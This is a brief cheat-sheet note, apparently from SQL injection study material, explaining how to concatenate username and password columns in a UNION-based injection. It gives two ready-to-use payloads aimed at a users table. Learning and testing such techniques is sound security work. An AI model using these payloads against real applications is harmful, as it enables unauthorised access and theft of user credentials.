# concat

> in case of having only one column request but need a two column connection data like username-password, can concat two column data and returned as one column data

`' UNION SELECT username || '-' || password FROM users--`

- will return `username-password` in one string

> this could work too:

`' UNION SELECT null, username || '-' || password FROM users--`

- the first column might not return string but number, in this case the first column useless for us
